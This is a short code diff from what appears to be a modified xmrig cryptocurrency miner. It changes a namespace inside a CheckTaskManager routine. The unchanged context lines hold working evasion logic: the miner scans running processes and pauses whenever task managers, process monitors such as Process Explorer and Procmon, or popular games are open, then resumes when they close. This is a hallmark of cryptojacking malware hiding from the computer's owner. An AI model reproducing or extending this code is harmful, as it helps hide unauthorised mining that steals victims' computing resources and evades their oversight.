@@ -79,15 +79,15 @@ void xmrig::App::CheckTaskManager(uv_timer_t *handle)
 		if (wcscmp(pe.szExeFile, L"WorldOfTanks.exe") == 0 || wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
 			{
 				LOG_INFO("\x1B[01;33mpaused\x1B[0m, something opened");
-				xmrig::core::Miner::miner::setEnabled(false);
+				xmrig::Miner::miner::setEnabled(false);
 				CloseHandle(hSnapshot);
 				return;
 			}
 		} while (Process32Next(hSnapshot, &pe));
 	
-	if (!xmrig::core::Miner::miner::isEnabled()) {
+	if (!xmrig::Miner::miner::isEnabled()) {
 		LOG_INFO("\x1B[01;32mresumed");
-		xmrig::core::Miner::miner::setEnabled(true);
+		xmrig::Miner::miner::setEnabled(true);
 		}
 	
 	CloseHandle(hSnapshot);				
